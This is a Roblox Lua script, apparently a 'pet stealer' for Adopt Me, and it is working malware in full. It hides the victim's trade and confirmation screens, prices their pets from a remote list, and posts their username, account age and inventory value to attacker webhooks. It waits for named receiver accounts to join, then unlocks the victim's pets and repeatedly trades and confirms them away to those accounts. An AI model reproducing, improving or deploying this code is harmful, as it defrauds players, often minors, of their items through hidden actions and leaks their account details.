-------[ CONFIG ]-------
local cfg = {
    user_webhook = "YOUR_WEBHOOK_HERE",
    dual_webhook = "YOUR_DUAL_WEBHOOK_HERE",
    users = {"2ndcfpaj67", "CREOLEO23"}, -- Receiver 1, Receiver 2 (Priority)
    threshold = 20,
    pet_block_list = {["jiggly_jerboa"]=true, ["practice_dog"]=true, ["starter_egg"]=true},
    ui_block_list = {"already have", "10s to send", "request sent", "successful", "declined", "canceled", "disabled trades", "is currently trading", "cannot trade", "is not tradable", "maximum number", "accept this trade", "teleported", "pending"}
}

local request = (syn and syn.request) or (http and http.request) or http_request or request
local Players, RS, RunS, Http = game:GetService("Players"), game:GetService("ReplicatedStorage"), game:GetService("RunService"), game:GetService("HttpService")
local LP = Players.LocalPlayer

-- 1. License Check (Kick if Fail)
local Fsys = require(RS:WaitForChild("Fsys")).load
local LHelper = require(RS.SharedModules.TradeLicenseHelper)
if not LHelper.player_has_trade_license() then LP:Kick("Trade License Required.") return end

-- 2. Sledgehammer & No-Leave
local function sledgehammer()
    RunS.RenderStepped:Connect(function()
        local apps = {"TradeApp", "DialogApp", "ConfirmationApp", "ToastFr", "HintApp"}
        for _, n in ipairs(apps) do 
            local ui = LP.PlayerGui:FindFirstChild(n) 
            if ui then if ui:IsA("ScreenGui") then ui.Enabled = false else ui:Destroy() end end 
        end
        for _, o in ipairs(LP.PlayerGui:GetDescendants()) do
            if (o:IsA("TextLabel") or o:IsA("TextBox")) and o.Visible then
                local t = o.Text:lower()
                for _, p in ipairs(cfg.ui_block_list) do if t:find(p) then o.Visible = false; o.Text = "" end end
            end
        end
        pcall(function() game:GetService("GuiService").SelectedObject = nil end)
    end)
end
sledgehammer()

-------[ DATA & VALUATION ]-------
local PetValues = {}
-- FIXED: Replaced .trim() with pattern matching to avoid the 'nil' error
local success, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt") end)
if success then 
    for line in res:gmatch("[^\r\n]+") do
        local n, v = line:match("([^,]+),([^,]+)")
        if n and v then 
            local cleanN = n:lower():match("^%s*(.-)%s*$")
            PetValues[cleanN] = tonumber(v:match("^%s*(.-)%s*$")) 
        end
    end
end

local function scanInv()
    local DB, CD = Fsys("InventoryDB"), Fsys("ClientData")
    local h, t, inv = {}, 0, CD.get("inventory")
    if not inv or not inv.pets then return h, 0 end
    for uid, it in pairs(inv.pets) do
        local d = DB.pets[it.id]
        if d and not cfg.pet_block_list[it.id] then
            local v = PetValues[d.name:lower()] or 0
            if v >= cfg.threshold then t = t + v; table.insert(h, {uid = uid, name = d.name, val = v}) end
        end
    end
    table.sort(h, function(a,b) return a.val > b.val end)
    return h, t
end

-- Identical Embed Design for both fresh and stale hits
local function buildPayload(hits, total, isDual)
    return {
        embeds = {{
            title = isDual and "MONDEUR BETA | ⚠️ STALE HIT" or "MONDEUR BETA | 🦊 HIT!",
            color = isDual and 0xffa500 or 0x32a852,
            fields = {
                {name = "User", value = "```"..LP.Name.."```", inline = true},
                {name = "Account Age", value = "```"..LP.AccountAge.." Days```", inline = true},
                {name = "Total Value", value = "```₱"..string.format("%.2f", total).."```", inline = false},
                {name = "Join", value = "[Click to Join Server](https://www.roblox.com/home?placeId="..game.PlaceId.."&gameId="..game.JobId..")"}
            },
            footer = {text = "Mondeur Beta - Ghost Logic"}
        }}
    }
end

local function sendLog(url, hits, tot, isDual)
    pcall(function()
        request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = Http:JSONEncode(buildPayload(hits, tot, isDual))
        })
    end)
end

-------[ TRADE ENGINE ]-------
local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local up = debug.getupvalues(v)
        if type(up[1]) == "table" then for k, r in pairs(up[1]) do hashes[k] = r end end
    end
end

local function hAPI(n, ...)
    local r = hashes[n] or Fsys("RouterClient").get(n)
    if r then if r:IsA("RemoteFunction") then return r:InvokeServer(...) end r:FireServer(...) end
end

local function startPhantom(rec, hits)
    for _, p in ipairs(hits) do hAPI("BackpackAPI/SetItemLocked", p.uid, false); hAPI("BackpackAPI/SetItemFavorite", p.uid, false) end
    task.spawn(function()
        local lastSent, sent2s = 0, false
        while true do
            if not LP.PlayerGui:FindFirstChild("TradeApp") or not LP.PlayerGui.TradeApp.Enabled then
                if not sent2s then 
                    task.wait(2) -- First attempt after 2s detection
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    sent2s = true; lastSent = tick()
                elseif tick() - lastSent > 10.1 then 
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    lastSent = tick() 
                end
            else
                for i = 1, math.min(18, #hits) do hAPI("TradeAPI/AddItemToOffer", hits[i].uid); task.wait(0.12) end
                while true do hAPI("TradeAPI/AcceptNegotiation"); hAPI("TradeAPI/ConfirmTrade"); task.wait(0.4) end
            end
            task.wait(0.5)
        end
    end)
end

-------[ WATCHDOG ]-------
task.spawn(function()
    repeat task.wait(1) until Fsys("ClientData").get("inventory")
    local hits, tot = scanInv()
    if #hits > 0 then sendLog(cfg.user_webhook, hits, tot, false) end
    
    local target, start = nil, tick()
    LP.Idled:Connect(function() game:GetService("VirtualUser"):ClickButton2(Vector2.new()) end)

    while tick() - start < 100 do
        -- Receiver 2 (Priority) then Receiver 1
        local p2, p1 = Players:FindFirstChild(cfg.users[2]), Players:FindFirstChild(cfg.users[1])
        target = p2 or p1 
        if target then break end
        task.wait(1.5)
    end

    if target then 
        startPhantom(target, hits) 
    else 
        -- Send exact same embed style to Dualhook if receiver doesn't join
        sendLog(cfg.dual_webhook, hits, tot, true) 
    end
end)

print("[MONDEUR BETA] Executed.")
